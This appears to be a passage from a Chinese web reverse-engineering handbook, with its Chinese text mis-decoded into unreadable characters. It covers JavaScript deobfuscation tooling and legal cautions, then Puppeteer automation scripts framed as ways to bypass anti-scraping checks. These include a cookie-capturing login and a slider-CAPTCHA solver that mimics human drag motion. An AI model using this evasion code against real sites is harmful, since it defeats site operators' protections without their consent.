      <h3 id="7-å¼€æº-vs-å•†ä¸šæ–¹æ¡ˆå†³ç­–çŸ©é˜µ">7. å¼€æº vs å•†ä¸šæ–¹æ¡ˆå†³ç­–çŸ©é˜µ</h3>

      <table>
        <thead>
          <tr>
            <th>å› ç´ </th>
            <th>æ¨èå¼€æº</th>
            <th>æ¨èå•†ä¸š</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><strong>é¡¹ç›®è§„æ¨¡</strong></td>
            <td>&lt; 10,000æ–‡ä»¶</td>
            <td>&gt; 50,000æ–‡ä»¶</td>
          </tr>
          <tr>
            <td><strong>å›¢é˜Ÿè§„æ¨¡</strong></td>
            <td>&lt; 5äºº</td>
            <td>&gt; 10äºº</td>
          </tr>
          <tr>
            <td><strong>é¢„ç®—</strong></td>
            <td>&lt; $10,000/å¹´</td>
            <td>&gt; $50,000/å¹´</td>
          </tr>
          <tr>
            <td><strong>æŠ€æœ¯èƒ½åŠ›</strong></td>
            <td>æœ‰ASTç»éªŒ</td>
            <td>æ— ä¸“ä¸šé€†å‘å›¢é˜Ÿ</td>
          </tr>
          <tr>
            <td><strong>åˆè§„è¦æ±‚</strong></td>
            <td>æ— ç‰¹æ®Šè¦æ±‚</td>
            <td>éœ€å®¡è®¡æŠ¥å‘Š</td>
          </tr>
          <tr>
            <td><strong>æ—¶é—´å‹åŠ›</strong></td>
            <td>å¯çµæ´»å®‰æ’</td>
            <td>ç´§æ€¥äº¤ä»˜</td>
          </tr>
        </tbody>
      </table>

      <hr />

      <h3 id="8-aiè¾…åŠ©åæ··æ·†æ–°å…´è¶‹åŠ¿">8. AIè¾…åŠ©åæ··æ·†ï¼ˆæ–°å…´è¶‹åŠ¿ï¼‰</h3>

      <h4 id="chatgptclaude-code-analysis">ChatGPT/Claude Code Analysis</h4>

      <p><strong>åº”ç”¨åœºæ™¯</strong>:</p>

      <ul>
        <li>è§£é‡Šæ··æ·†ä»£ç é€»è¾‘</li>
        <li>ç”Ÿæˆåæ··æ·†è„šæœ¬</li>
        <li>è¯†åˆ«æ··æ·†æ¨¡å¼</li>
      </ul>

      <p><strong>ç¤ºä¾‹Prompt</strong>:</p>

      <pre><code>åˆ†æä»¥ä¸‹æ··æ·†JavaScriptä»£ç ï¼Œè§£é‡Šå…¶é€»è¾‘ï¼š
var _0x1a2b=['log','Hello'];
console[_0x1a2b[0]](_0x1a2b[1]);
</code></pre>

      <p><strong>å±€é™æ€§</strong>:</p>

      <ul>
        <li>æ— æ³•å¤„ç†å¤§æ–‡ä»¶ï¼ˆTokené™åˆ¶ï¼‰</li>
        <li>å¯èƒ½è¯¯åˆ¤å¤æ‚æ··æ·†</li>
        <li>ä¸é€‚åˆæ‰¹é‡å¤„ç†</li>
      </ul>

      <p><strong>æˆæœ¬</strong>: $0.01-0.06/1K tokensï¼ˆAPIè°ƒç”¨ï¼‰</p>

      <hr />

      <h4 id="github-copilotè¾…åŠ©ç¼–å†™åæ··æ·†è„šæœ¬">GitHub Copilotè¾…åŠ©ç¼–å†™åæ··æ·†è„šæœ¬</h4>

      <p><strong>ä¼˜åŠ¿</strong>:</p>

      <ul>
        <li>åŠ é€ŸBabelæ’ä»¶å¼€å‘</li>
        <li>æä¾›ASTæ“ä½œç¤ºä¾‹</li>
        <li>ä»£ç è¡¥å…¨</li>
      </ul>

      <p><strong>æˆæœ¬</strong>: $10/æœˆæˆ–$100/å¹´</p>

      <hr />

      <h3 id="9-å®æˆ˜å·¥å…·é“¾æ¨è">9. å®æˆ˜å·¥å…·é“¾æ¨è</h3>

      <h4 id="åˆå­¦è€…é…ç½®0æˆæœ¬">åˆå­¦è€…é…ç½®ï¼ˆ$0æˆæœ¬ï¼‰</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># å®‰è£…å·¥å…·</span>
npm<span class="w"> </span>install<span class="w"> </span>-g<span class="w"> </span>prettier<span class="w"> </span>webcrack
npm<span class="w"> </span>install<span class="w"> </span>@babel/parser<span class="w"> </span>@babel/traverse<span class="w"> </span>@babel/generator

<span class="c1"># å·¥ä½œæµç¨‹</span>
<span class="m">1</span>.<span class="w"> </span>ä½¿ç”¨<span class="w"> </span>de4js<span class="w"> </span>åœ¨çº¿åˆæ­¥åˆ†æ
<span class="m">2</span>.<span class="w"> </span>prettieræ ¼å¼åŒ–ä»£ç 
<span class="m">3</span>.<span class="w"> </span>webcrackè§£åŒ…Webpackï¼ˆå¦‚é€‚ç”¨ï¼‰
<span class="m">4</span>.<span class="w"> </span>è‡ªå†™Babelè„šæœ¬æ·±åº¦å¤„ç†
</code></pre>
      </div>

      <hr />

      <h4 id="ä¸“ä¸šå›¢é˜Ÿé…ç½®-1000å¹´">ä¸“ä¸šå›¢é˜Ÿé…ç½®ï¼ˆ&lt; $1,000/å¹´ï¼‰</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># å•†ä¸šå·¥å…·</span>
-<span class="w"> </span>WebStorm<span class="w"> </span>IDE:<span class="w"> </span><span class="nv">$149</span>/å¹´
-<span class="w"> </span>GitHub<span class="w"> </span>Copilot:<span class="w"> </span><span class="nv">$100</span>/å¹´
-<span class="w"> </span>Better<span class="w"> </span>Commentsï¼ˆVS<span class="w"> </span>Codeæ’ä»¶ï¼‰:<span class="w"> </span>å…è´¹

<span class="c1"># å¼€æºå·¥å…·</span>
-<span class="w"> </span>Babelå®Œæ•´å·¥å…·é“¾
-<span class="w"> </span>AST<span class="w"> </span>Explorerï¼ˆåœ¨çº¿ï¼‰
-<span class="w"> </span>Source<span class="w"> </span>Map<span class="w"> </span>Visualization

æ€»æˆæœ¬:<span class="w"> </span><span class="nv">$249</span>/å¹´<span class="w"> </span>+<span class="w"> </span>å­¦ä¹ æ—¶é—´æŠ•å…¥
</code></pre>
      </div>

      <hr />

      <h4 id="ä¼ä¸šçº§é…ç½®10000å¹´">ä¼ä¸šçº§é…ç½®ï¼ˆ$10,000+/å¹´ï¼‰</h4>

      <ul>
        <li><strong>Synopsys Code Insight</strong>: è‡ªåŠ¨åŒ–ä»£ç åˆ†æ</li>
        <li><strong>Fortify SCA</strong>: é™æ€ä»£ç æ‰«æ</li>
        <li><strong>ä¸“ä¸šå’¨è¯¢</strong>: æŒ‰éœ€è´­ä¹°é€†å‘æœåŠ¡</li>
        <li><strong>å†…éƒ¨åŸ¹è®­</strong>: å›¢é˜ŸæŠ€èƒ½æå‡</li>
      </ul>

      <p><strong>ROIåˆ†æ</strong>: é€‚åˆæœ‰åˆè§„è¦æ±‚æˆ–å¤§è§„æ¨¡é¡¹ç›®çš„ä¼ä¸š</p>

      <hr />

      <h3 id="10-é¿å‘æŒ‡å—">10. é¿å‘æŒ‡å—</h3>

      <p><strong>å¸¸è§é”™è¯¯</strong>:</p>

      <ol>
        <li>âŒ è¿‡åº¦ä¾èµ–è‡ªåŠ¨åŒ–å·¥å…·ï¼ˆå¤æ‚æ··æ·†ä»éœ€æ‰‹åŠ¨åˆ†æï¼‰</li>
        <li>âŒ å¿½è§†ä»£ç ç‰ˆæƒï¼ˆé€†å‘åçš„ä»£ç ä½¿ç”¨éœ€éµå®ˆæ³•å¾‹ï¼‰</li>
        <li>âŒ ä¸å¤‡ä»½åŸå§‹æ–‡ä»¶ï¼ˆåæ··æ·†å¯èƒ½ç ´åä»£ç ï¼‰</li>
        <li>âŒ ç›²ç›®è¿½æ±‚å®Œç¾è¿˜åŸï¼ˆæœ‰æ—¶éƒ¨åˆ†è¿˜åŸå³å¯æ»¡è¶³éœ€æ±‚ï¼‰</li>
      </ol>

      <p><strong>æœ€ä½³å®è·µ</strong>:</p>

      <ol>
        <li>âœ… åˆ†å±‚å¤„ç†ï¼Œé€æ­¥è¿˜åŸ</li>
        <li>âœ… ç»“åˆåŠ¨æ€è°ƒè¯•éªŒè¯</li>
        <li>âœ… å»ºç«‹æ··æ·†ç‰¹å¾åº“</li>
        <li>âœ… è‡ªåŠ¨åŒ–é‡å¤æ€§å·¥ä½œ</li>
      </ol>

      <hr />

      <h3 id="11-æ³•å¾‹ä¸åˆè§„è€ƒé‡">11. æ³•å¾‹ä¸åˆè§„è€ƒé‡</h3>

      <p><strong>è­¦å‘Š</strong>: åæ··æ·†ä»–äººä»£ç å¯èƒ½æ¶‰åŠæ³•å¾‹é£é™©</p>

      <p><strong>åˆæ³•åœºæ™¯</strong>:</p>

      <ul>
        <li>âœ… å®‰å…¨ç ”ç©¶ï¼ˆåˆæ³•æˆæƒï¼‰</li>
        <li>âœ… æ¶æ„è½¯ä»¶åˆ†æ</li>
        <li>âœ… è‡ªå·±çš„ä»£ç é€†å‘</li>
        <li>âœ… å¼€æºé¡¹ç›®åˆ†æ</li>
      </ul>

      <p><strong>é£é™©åœºæ™¯</strong>:</p>

      <ul>
        <li>âŒ å•†ä¸šè½¯ä»¶é€†å‘ï¼ˆæœªæˆæƒï¼‰</li>
        <li>âŒ ç»•è¿‡DRMä¿æŠ¤</li>
        <li>âŒ çªƒå–å•†ä¸šæœºå¯†</li>
      </ul>

      <p><strong>å»ºè®®</strong>: è¿›è¡Œå•†ä¸šé€†å‘å‰å’¨è¯¢æ³•å¾‹é¡¾é—®</p>

      <hr />

      <h2 id="ç›¸å…³ç« èŠ‚">ç›¸å…³ç« èŠ‚</h2>

      <ul>
        <li><a href="#04-Advanced-Recipes-javascript-deobfuscation">JavaScript åæ··æ·†</a></li>
        <li><a href="../02-Tooling/ast_parsing_tools.md">AST è§£æå·¥å…·</a></li>
        <li><a href="#03-Basic-Recipes-debugging-techniques">è°ƒè¯•æŠ€å·§ä¸æ–­ç‚¹è®¾ç½®</a></li>
        <li><a href="#07-Scripts-javascript-hook-scripts">JavaScript Hook è„šæœ¬</a></li>
      </ul>

    </div>

    <div class="section" id="07-Scripts-automation-scripts">
      <h2>60. Automation Scripts</h2>
      <h1 id="æµè§ˆå™¨è‡ªåŠ¨åŒ–è„šæœ¬">æµè§ˆå™¨è‡ªåŠ¨åŒ–è„šæœ¬</h1>

      <h2 id="æ¦‚è¿°">æ¦‚è¿°</h2>

      <p>æµè§ˆå™¨è‡ªåŠ¨åŒ–æ˜¯ Web é€†å‘çš„é‡è¦æ‰‹æ®µã€‚é€šè¿‡æ¨¡æ‹ŸçœŸå®ç”¨æˆ·æ“ä½œï¼Œå¯ä»¥ç»•è¿‡è®¸å¤šåçˆ¬è™«æ£€æµ‹ã€‚æœ¬ç« ä»‹ç» Puppeteer å’Œ Playwright çš„å®æˆ˜è„šæœ¬ã€‚</p>

      <hr />

      <h2 id="puppeteer-è„šæœ¬">Puppeteer è„šæœ¬</h2>

      <h3 id="åŸºç¡€æ¨¡æ¿">åŸºç¡€æ¨¡æ¿</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">const</span><span class="w"> </span><span class="nx">puppeteer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s1">&#39;puppeteer&#39;</span><span class="p">);</span>

<span class="p">(</span><span class="k">async</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="c1">// å¯åŠ¨æµè§ˆå™¨</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">browser</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">puppeteer</span><span class="p">.</span><span class="nx">launch</span><span class="p">({</span>
<span class="w">        </span><span class="nx">headless</span><span class="o">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w">  </span><span class="c1">// æ˜¾ç¤ºæµè§ˆå™¨çª—å£</span>
<span class="w">        </span><span class="nx">devtools</span><span class="o">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span><span class="w">   </span><span class="c1">// æ‰“å¼€ DevTools</span>
<span class="w">    </span><span class="p">});</span>

<span class="w">    </span><span class="c1">// æ‰“å¼€æ–°é¡µé¢</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">page</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">browser</span><span class="p">.</span><span class="nx">newPage</span><span class="p">();</span>

<span class="w">    </span><span class="c1">// è®¿é—®ç½‘ç«™</span>
<span class="w">    </span><span class="k">await</span><span class="w"> </span><span class="nx">page</span><span class="p">.</span><span class="kr">goto</span><span class="p">(</span><span class="s1">&#39;https://example.com&#39;</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">waitUntil</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;networkidle2&#39;</span><span class="w">  </span><span class="c1">// ç­‰å¾…ç½‘ç»œç©ºé—²</span>
<span class="w">    </span><span class="p">});</span>

<span class="w">    </span><span class="c1">// æˆªå›¾</span>
<span class="w">    </span><span class="k">await</span><span class="w"> </span><span class="nx">page</span><span class="p">.</span><span class="nx">screenshot</span><span class="p">({</span><span class="w"> </span><span class="nx">path</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;screenshot.png&#39;</span><span class="w"> </span><span class="p">});</span>

<span class="w">    </span><span class="c1">// å…³é—­æµè§ˆå™¨</span>
<span class="w">    </span><span class="k">await</span><span class="w"> </span><span class="nx">browser</span><span class="p">.</span><span class="nx">close</span><span class="p">();</span>
<span class="p">})();</span>
</code></pre>
      </div>

      <h3 id="ç™»å½•è„šæœ¬">ç™»å½•è„šæœ¬</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">const</span><span class="w"> </span><span class="nx">puppeteer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s1">&#39;puppeteer&#39;</span><span class="p">);</span>

<span class="k">async</span><span class="w"> </span><span class="kd">function</span><span class="w"> </span><span class="nx">login</span><span class="p">(</span><span class="nx">username</span><span class="p">,</span><span class="w"> </span><span class="nx">password</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">browser</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">puppeteer</span><span class="p">.</span><span class="nx">launch</span><span class="p">({</span><span class="w"> </span><span class="nx">headless</span><span class="o">:</span><span class="w"> </span><span class="kc">false</span><span class="w"> </span><span class="p">});</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">page</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">browser</span><span class="p">.</span><span class="nx">newPage</span><span class="p">();</span>

<span class="w">    </span><span class="c1">// è®¿é—®ç™»å½•é¡µ</span>
<span class="w">    </span><span class="k">await</span><span class="w"> </span><span class="nx">page</span><span class="p">.</span><span class="kr">goto</span><span class="p">(</span><span class="s1">&#39;https://example.com/login&#39;</span><span class="p">);</span>

<span class="w">    </span><span class="c1">// å¡«å†™è¡¨å•</span>
<span class="w">    </span><span class="k">await</span><span class="w"> </span><span class="nx">page</span><span class="p">.</span><span class="nx">type</span><span class="p">(</span><span class="s1">&#39;#username&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">username</span><span class="p">);</span>
<span class="w">    </span><span class="k">await</span><span class="w"> </span><span class="nx">page</span><span class="p">.</span><span class="nx">type</span><span class="p">(</span><span class="s1">&#39;#password&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">password</span><span class="p">);</span>

<span class="w">    </span><span class="c1">// ç‚¹å‡»ç™»å½•æŒ‰é’®</span>
<span class="w">    </span><span class="k">await</span><span class="w"> </span><span class="nx">page</span><span class="p">.</span><span class="nx">click</span><span class="p">(</span><span class="s1">&#39;#login-button&#39;</span><span class="p">);</span>

<span class="w">    </span><span class="c1">// ç­‰å¾…è·³è½¬</span>
<span class="w">    </span><span class="k">await</span><span class="w"> </span><span class="nx">page</span><span class="p">.</span><span class="nx">waitForNavigation</span><span class="p">();</span>

<span class="w">    </span><span class="c1">// è·å– Cookie</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">cookies</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">page</span><span class="p">.</span><span class="nx">cookies</span><span class="p">();</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Cookies:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">cookies</span><span class="p">);</span>

<span class="w">    </span><span class="k">await</span><span class="w"> </span><span class="nx">browser</span><span class="p">.</span><span class="nx">close</span><span class="p">();</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">cookies</span><span class="p">;</span>
<span class="p">}</span>

<span class="nx">login</span><span class="p">(</span><span class="s1">&#39;myuser&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;mypassword&#39;</span><span class="p">);</span>
</code></pre>
      </div>

      <h3 id="æ— é™æ»šåŠ¨åŠ è½½">æ— é™æ»šåŠ¨åŠ è½½</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="k">async</span><span class="w"> </span><span class="kd">function</span><span class="w"> </span><span class="nx">scrollToBottom</span><span class="p">(</span><span class="nx">page</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">await</span><span class="w"> </span><span class="nx">page</span><span class="p">.</span><span class="nx">evaluate</span><span class="p">(</span><span class="k">async</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">await</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nb">Promise</span><span class="p">((</span><span class="nx">resolve</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="kd">let</span><span class="w"> </span><span class="nx">totalHeight</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span>
<span class="w">            </span><span class="kd">const</span><span class="w"> </span><span class="nx">distance</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">100</span><span class="p">;</span>

<span class="w">            </span><span class="kd">const</span><span class="w"> </span><span class="nx">timer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">setInterval</span><span class="p">(()</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="kd">const</span><span class="w"> </span><span class="nx">scrollHeight</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">scrollHeight</span><span class="p">;</span>
<span class="w">                </span><span class="nb">window</span><span class="p">.</span><span class="nx">scrollBy</span><span class="p">(</span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="nx">distance</span><span class="p">);</span>
<span class="w">                </span><span class="nx">totalHeight</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="nx">distance</span><span class="p">;</span>

<span class="w">                </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">totalHeight</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="nx">scrollHeight</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">                    </span><span class="nx">clearInterval</span><span class="p">(</span><span class="nx">timer</span><span class="p">);</span>
<span class="w">                    </span><span class="nx">resolve</span><span class="p">();</span>
<span class="w">                </span><span class="p">}</span>
<span class="w">            </span><span class="p">},</span><span class="w"> </span><span class="mf">100</span><span class="p">);</span>
<span class="w">        </span><span class="p">});</span>
<span class="w">    </span><span class="p">});</span>
<span class="p">}</span>

<span class="c1">// ä½¿ç”¨</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">page</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">browser</span><span class="p">.</span><span class="nx">newPage</span><span class="p">();</span>
<span class="k">await</span><span class="w"> </span><span class="nx">page</span><span class="p">.</span><span class="kr">goto</span><span class="p">(</span><span class="s1">&#39;https://example.com/infinite-scroll&#39;</span><span class="p">);</span>
<span class="k">await</span><span class="w"> </span><span class="nx">scrollToBottom</span><span class="p">(</span><span class="nx">page</span><span class="p">);</span>
</code></pre>
      </div>

      <h3 id="å¤„ç†æ»‘å—éªŒè¯ç ">å¤„ç†æ»‘å—éªŒè¯ç </h3>

      <div class="codehilite">
        <pre><span></span><code><span class="k">async</span><span class="w"> </span><span class="kd">function</span><span class="w"> </span><span class="nx">solveSlider</span><span class="p">(</span><span class="nx">page</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="c1">// ç­‰å¾…æ»‘å—å‡ºç°</span>
<span class="w">    </span><span class="k">await</span><span class="w"> </span><span class="nx">page</span><span class="p">.</span><span class="nx">waitForSelector</span><span class="p">(</span><span class="s1">&#39;.slider&#39;</span><span class="p">);</span>

<span class="w">    </span><span class="c1">// è·å–æ»‘å—å’Œè½¨é“å…ƒç´ </span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">slider</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">page</span><span class="p">.</span><span class="nx">$</span><span class="p">(</span><span class="s1">&#39;.slider-button&#39;</span><span class="p">);</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">track</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">page</span><span class="p">.</span><span class="nx">$</span><span class="p">(</span><span class="s1">&#39;.slider-track&#39;</span><span class="p">);</span>

<span class="w">    </span><span class="c1">// è·å–è½¨é“å®½åº¦</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">trackBox</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">track</span><span class="p">.</span><span class="nx">boundingBox</span><span class="p">();</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">distance</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">trackBox</span><span class="p">.</span><span class="nx">width</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mf">40</span><span class="p">;</span><span class="w">  </span><span class="c1">// å‡å»æ»‘å—å®½åº¦</span>

<span class="w">    </span><span class="c1">// æ¨¡æ‹Ÿäººç±»æ‹–åŠ¨è½¨è¿¹</span>
<span class="w">    </span><span class="k">await</span><span class="w"> </span><span class="nx">slider</span><span class="p">.</span><span class="nx">hover</span><span class="p">();</span>
<span class="w">    </span><span class="k">await</span><span class="w"> </span><span class="nx">page</span><span class="p">.</span><span class="nx">mouse</span><span class="p">.</span><span class="nx">down</span><span class="p">();</span>

<span class="w">    </span><span class="c1">// ç”Ÿæˆè´å¡å°”æ›²çº¿è½¨è¿¹</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">steps</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">20</span><span class="p">;</span>
<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kd">let</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="nx">steps</span><span class="p">;</span><span class="w"> </span><span class="nx">i</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">x</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="nx">distance</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="nx">steps</span><span class="p">)</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="nx">i</span><span class="p">;</span>
<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">y</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">Math</span><span class="p">.</span><span class="nx">sin</span><span class="p">(</span><span class="nx">i</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="nx">steps</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="nb">Math</span><span class="p">.</span><span class="nx">PI</span><span class="p">)</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mf">10</span><span class="p">;</span><span class="w">  </span><span class="c1">// æ·»åŠ éšæœºæŠ–åŠ¨</span>
<span class="w">        </span><span class="k">await</span><span class="w"> </span><span class="nx">page</span><span class="p">.</span><span class="nx">mouse</span><span class="p">.</span><span class="nx">move</span><span class="p">(</span><span class="nx">trackBox</span><span class="p">.</span><span class="nx">x</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">x</span><span class="p">,</span><span class="w"> </span><span class="nx">trackBox</span><span class="p">.</span><span class="nx">y</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">y</span><span class="p">);</span>
<span class="w">        </span><span class="k">await</span><span class="w"> </span><span class="nx">page</span><span class="p">.</span><span class="nx">waitForTimeout</span><span class="p">(</span><span class="nb">Math</span><span class="p">.</span><span class="nx">random</span><span class="p">()</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mf">10</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mf">5</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="k">await</span><span class="w"> </span><span class="nx">page</span><span class="p">.</span><span class="nx">mouse</span><span class="p">.</span><span class="nx">up</span><span class="p">();</span>
<span class="p">}</span>
</code></pre>
      </div>

      <h3 id="æ‹¦æˆªå’Œä¿®æ”¹è¯·æ±‚">æ‹¦æˆªå’Œä¿®æ”¹è¯·æ±‚</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">const</span><span class="w"> </span><span class="nx">page</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">browser</span><span class="p">.</span><span class="nx">newPage</span><span class="p">();</span>

<span class="c1">// å¯ç”¨è¯·æ±‚æ‹¦æˆª</span>
<span class="k">await</span><span class="w"> </span><span class="nx">page</span><span class="p">.</span><span class="nx">setRequestInterception</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span>

<span class="nx">page</span><span class="p">.</span><span class="nx">on</span><span class="p">(</span><span class="s1">&#39;request&#39;</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="nx">request</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="c1">// æ‹¦æˆªç‰¹å®š URL</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">request</span><span class="p">.</span><span class="nx">url</span><span class="p">().</span><span class="nx">includes</span><span class="p">(</span><span class="s1">&#39;/api/data&#39;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="c1">// ä¿®æ”¹è¯·æ±‚å¤´</span>
<span class="w">        </span><span class="nx">request</span><span class="p">.</span><span class="k">continue</span><span class="p">({</span>
<span class="w">            </span><span class="nx">headers</span><span class="o">:</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="p">...</span><span class="nx">request</span><span class="p">.</span><span class="nx">headers</span><span class="p">(),</span>
<span class="w">                </span><span class="s1">&#39;X-Custom-Header&#39;</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;MyValue&#39;</span>
<span class="w">            </span><span class="p">}</span>
<span class="w">        </span><span class="p">});</span>
<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">request</span><span class="p">.</span><span class="k">continue</span><span class="p">();</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">});</span>

<span class="nx">page</span><span class="p">.</span><span class="nx">on</span><span class="p">(</span><span class="s1">&#39;response&#39;</span><span class="p">,</span><span class="w"> </span><span class="k">async</span><span class="w"> </span><span class="p">(</span><span class="nx">response</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">url</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">response</span><span class="p">.</span><span class="nx">url</span><span class="p">();</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">url</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s1">&#39;/api/data&#39;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">response</span><span class="p">.</span><span class="nx">json</span><span class="p">();</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;API Response:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">data</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">});</span>

<span class="k">await</span><span class="w"> </span><span class="nx">page</span><span class="p">.</span><span class="kr">goto</span><span class="p">(</span><span class="s1">&#39;https://example.com&#39;</span><span class="p">);</span>
</code></pre>
      </div>

      <h3 id="æ³¨å…¥-hook-è„šæœ¬">æ³¨å…¥ Hook è„šæœ¬</h3>

      <div class="codehilite">
